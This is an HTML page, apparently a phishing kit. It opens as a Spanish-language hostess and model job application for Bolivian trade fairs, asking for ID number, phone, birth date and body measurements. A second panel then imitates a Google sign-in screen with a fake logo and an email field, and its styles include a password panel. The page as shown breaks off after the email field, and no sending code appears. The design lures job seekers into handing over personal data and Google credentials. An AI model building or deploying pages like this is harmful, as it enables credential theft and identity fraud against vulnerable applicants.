<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Trabajo</title>
    <style>
        /* ======== Variables Globales ======== */
        :root {
            --primary-color: #62a;
            --secondary-color: #7a3abd;
            --background-color: #ede1f7;
            --text-color: #333;
            --border-radius: 8px;
            --spacing: 16px;
            --transition: all 0.3s ease;
            --error-color: #dc3545;
            --success-color: #7a3abd;
            --border-color: #62a;
        }

        /* ======== Estilos generales ======== */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            text-align: center; 
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            height: 100%;
            width: 100%;
            position: fixed;
            overflow: hidden;
        }

        .panels-container {
            position: relative;
            width: 100%;
            height: 100vh;
            overflow: hidden;
        }
        #panel1 {
    background-color: #ede1f7 !important; /* Panel 1 con color lila */
}

#panel2, #panel3 {
    background-color: white !important; /* Panel 2 y Panel 3 en blanco */
}

        .panel {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 100%;
            
            transition: left 0.5s ease-in-out, opacity 0.3s ease-in-out;
            opacity: 0;
            overflow-y: auto;
            padding: 20px 10px;
        }

        .panel.active {
            left: 0;
            opacity: 1;
        }

        /* ======== ESTILOS PANEL 1 ======== */
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: var(--spacing);
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            border: solid var(--primary-color) 2px;
        }

        .header {
            text-align: center;
            margin-bottom: var(--spacing);
            color: var(--primary-color);
        }

        .info-section {
            background-color: #f8f9fa;
            padding: var(--spacing);
            border-radius: var(--border-radius);
            margin-bottom: var(--spacing);
            border-top: 12px solid var(--primary-color);
        }

        .info-section .custom-title {
    color: var(--primary-color);
    margin-bottom: 5px;
    font-size: 35px;
    text-align: left;
    font-weight: bold;
}
        .info-section p {
            color: var(--error-color);
            margin-bottom: 15px;            text-align: left;
        }

        .form-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: var(--spacing);
            margin-bottom: var(--spacing);
        }

        .form-group {
            margin-bottom: var(--spacing);
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-color);
        }

        input, select, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: var(--transition);
            background-color: white;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(98, 34, 170, 0.1);
        }

        button {
            background-color: var(--primary-color);
            color: white;
            padding: 14px 24px;
            border: none;
            border-radius: var(--border-radius);
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            margin-top: var(--spacing);
        }

        button:hover {
            background-color: var(--secondary-color);
            transform: translateY(-1px);
        }

        button:active {
            transform: translateY(1px);
        }

        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        .required-field::after {
            content: '*';
            color: var(--error-color);
        }

        /* ======== ESTILOS PANEL 2 ======== */
        .google-container {
            width: 90%;
            max-width: 360px;
            text-align: center;
            margin: 50px auto 0;
            padding: 20px;
        }

        .google-logo {
            font-size: 30px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .google-logo span:nth-child(1) { color: #4285F4; }
        .google-logo span:nth-child(2) { color: #EA4335; }
        .google-logo span:nth-child(3) { color: #FBBC05; }
        .google-logo span:nth-child(4) { color: #4285F4; }
        .google-logo span:nth-child(5) { color: #34A853; }
        .google-logo span:nth-child(6) { color: #EA4335; }

        .google-title {
            font-size: 25px;
            margin-bottom: 10px;
            font-weight: normal;
            color: black;
        }

        .google-text {
            font-size: 16px;
            color: #000111;
            margin-bottom: 15px;
        }

        .info-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 17px;
            display: inline-block;
            margin-bottom: 30px;
        }

        .input-box {
            position: relative;
            margin-bottom: 20px;
        }
        
        .input-box input:focus {
            border-color: #1a73e8;
        }

        .input-box label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #5f6368;
            transition: all 0.3s ease;
            pointer-events: none;
            background: white;
            padding: 0 5px;
        }

        .input-box input {
            width: 100%;
            padding: 15px 10px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .input-box input:focus + label,
        .input-box input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }

        .links {
            text-align: left;
            font-size: 15px;
            margin: 15px 0 30px;
        }

        .links a {
            color: #1a73e8;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .bottom-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }

        .btn-secondary {
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 15px;
            cursor: pointer;
            padding: 10px;
            width: auto;
        }

        .btn-primary {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            padding: 10px 20px;
            width: auto;
            margin-left: auto;
        }

        /* ======== ESTILOS PANEL 3 ======== */
        .login-container {
            width: 90%;
            max-width: 360px;
            text-align: center;
            margin: 50px auto 0;
            padding: 20px;
        }

        .logo {
            width: 80px;
            margin-bottom: 15px;
        }

        .email {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        .input-container label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #5f6368;
            transition: all 0.3s ease;
            pointer-events: none;
            background: white;
            padding: 0 5px;
        }

        .input-container input {
            width: 100%;
            padding: 15px 10px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .input-container input:focus {
            border-color: #1a73e8;
        }

        .input-container input:focus + label,
        .input-container input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }

        .forgot-password {
            text-align: left;
            font-size: 15px;
            margin: 20px 0;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 30px;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            padding: 10px 20px;
            width: auto;
        }

        .btn:hover {
            background-color: #1765cc;
        }

        .showPassword {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-top: 10px;
            font-size: 14px;
        }

        .showPassword input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
        }

        /* Estilos responsive adicionales */
        @media (max-width: 480px) {
            .info-section h2 {
                font-size: 22px;
            }
            
            .google-container, .login-container {
                width: 95%;
                padding: 15px;
            }
            
            .google-title {
                font-size: 22px;
            }
            
            .google-text {
                font-size: 14px;
            }
            
            .bottom-buttons {
                flex-direction: column;
                align-items: stretch;
                gap: 15px;
            }
            
            .btn-primary, .btn-secondary, .btn {
                width: 100%;
                margin: 5px 0;
            }
            
            .btn-container {
                justify-content: center;
            }
        }

        #successMessage {
            margin-top: 20px;
            padding: 15px;
            background-color: var(--success-color);
            color: white;
            border-radius: var(--border-radius);
            text-align: center;
        }
    </style>
<style>
    /* SweetAlert2 custom styles */
    .swal2-popup {
        background-color: var(--background-color, #ede1f7) !important;
        border: 3px solid var(--secondary-color, #7a3abd) !important;
        border-radius: 10px !important;
        padding: 20px !important;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.9) !important;
    }
    .swal2-title {
        color: var(--primary-color, #62a) !important;
        text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.5) !important;
        font-size: 1.5rem !important;
    }
    .swal2-styled.swal2-confirm {
        background-color: var(--primary-color, #62a) !important;

        padding: 5px 10px !important;
        border-radius: 5px !important;
        font-size: 0.8rem !important;
        transition: background-color 0.3s !important;

        font-size: 1.2rem;
        color: var(--text-color, #333); 
        background-color: var(--background-color, #ede1f7); 
        padding: 10px;
        border-radius: 5px;
        text-align: center;
        margin-top: 15px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);

</style>

</head>
<body>
    <div class="panels-container">
        <!-- Panel 1: Formulario de Postulación -->
        <section id="panel1" class="panel active">
            <div class="container">
                <header class="header">
                    <div class="info-section">
                      
    <div class="custom-title">FORMULARIO DE POSTULACION</div>

                        
                        <p>* Indica que la pregunta es obligatoria</p>
                    </div>
                </header>
                <form id="jobForm">
                    <div class="form-row">
                        <div class="form-group">
                            <label for="nombres" class="required-field">NOMBRES</label>
                            <input type="text" id="nombres" name="nombres" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese nombres válidos">
                        </div>
                        <div class="form-group">
                            <label for="apellidos" class="required-field">APELLIDOS</label>
                            <input type="text" id="apellidos" name="apellidos" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese apellidos válidos">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label for="telefono" class="required-field">TELEFONO</label>
                            <input type="tel" id="telefono" name="telefono" required pattern="[67]\d{7}" placeholder="Ej: 71234567" title="Ingrese un número válido">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label for="genero" class="required-field">GENERO</label>
                            <select id="genero" name="genero" required>
                                <option value="">Seleccione una opción</option>
                                <option value="femenino">Femenino</option>
                                <option value="masculino">Masculino</option>
                                <option value="otro">Otro</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="fecha_nacimiento" class="required-field">FECHA DE NACIMIENTO</label>
                            <input type="date" id="fecha_nacimiento" name="fecha_nacimiento" required max="2006-12-31">
                        </div>
                    </div>
                    <div class="form-group">
    <label for="nacionalidad" class="required-field">NACIONALIDAD</label>
    <input type="text" id="nacionalidad" name="nacionalidad" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese una nacionalidad válida">
</div>
                    <div class="form-row">
    <div class="form-group">
        <label for="documento" class="required-field">DOCUMENTO DE IDENTIDAD</label>
        <input type="text" id="documento" name="documento" required pattern="\d{7,10}" title="Ingrese un número de documento válido">
    </div>
</div>
<div class="form-row">
    <div class="form-group">
        <label for="ciudad" class="required-field">CIUDAD DONDE VIVES ACTUALMENTE</label>
        <input type="text" id="ciudad" name="ciudad" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese una ciudad válida">
    </div>
</div>
                    <div class="form-group">
                        <label for="postulacion" class="required-field">QUIERO POSTULARME A?</label>
                        <select id="postulacion" name="postulacion" required>
                            <option value="">Seleccione una opción</option>
                            <option value="expocruz">EXPOCRUZ</option>
                            <option value="fexpobeni">FEXPOBENI</option>
                            <option value="fexpofipaz">FIPAZ</option>
                            <option value="fexpococha">FEICOBOL (COCHABAMBA)</option>
                            <option value="fexposucre">FEXPOSUCRE</option><option value="fexpotarija">FEXPOTARIJA</option>
                            <option value="fexpopando">FEXPOPANDO</option>
                            <option value="fexponorte">EXPONORTE (MONTERO)</option>
                            <option value="fexpoauto">EXPOAUTO</option>
                            <option value="fexposoya">EXPOSOYA</option>
                            <option value="fexpoagro">FERIA AGROVIDAS</option>
                            <option value="fexpotros">OTROS</option>
                            
                        </select>
                    </div>
                    <div class="form-row">
    <div class="form-group">
        <label for="medidas" class="required-field">MEDIDAS (BUSTO-CINTURA-CADERA)</label>
        <input 
            type="text" 
            id="medidas" 
            name="medidas" 
            required 
            pattern="\d{2,3}-\d{2,3}-\d{2,3}"
            placeholder="Ej: 90-60-90"
            title="Formato: xxx-xxx-xxx">
        <span class="error-message">(Ej: 90-60-90)</span>
    </div>

    <div class="form-group">
        <label for="estatura" class="required-field">ESTATURA</label>
        <input 
            type="number" 
            id="estatura" 
            name="estatura" 
            required 
            min="140" 
            max="200"
            placeholder="Ej: 170">
        <span class="error-message"></span>
    </div>
</div>
                    <div class="form-group">
                        <label for="experiencia" class="required-field">TU EXPERIENCIA COMO MODELO Y/O AZAFATA</label>
                        <textarea id="experiencia" name="experiencia" rows="4" required placeholder="Describa su experiencia"></textarea>
                    </div>
                    <button type="submit" id="submitBtn">Enviar Postulación</button>
                </form>
                <div id="successMessage" style="display:none;">Postulación enviada con éxito</div>
            </div>
        </section>

        <!-- Panel 2: Google Login -->
        <section id="panel2" class="panel">
            <div class="google-container">
                <h1 class="google-logo">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </h1>
                <h2 class="google-title">Acceder</h2>
                <p class="google-text">Usa tu Cuenta de Google. La cuenta se agregará a este dispositivo y estará disponible para otras apps de Google.</p>
                <a href="#" class="info-link">Más información sobre el uso de tu cuenta</a>

                    <div class="input-box">
                        <input type="email" id="emailInput" name="email" placeholder=" " required />
                        <label for="emailInput">Correo electrónico o teléfono</label>
                    </div>
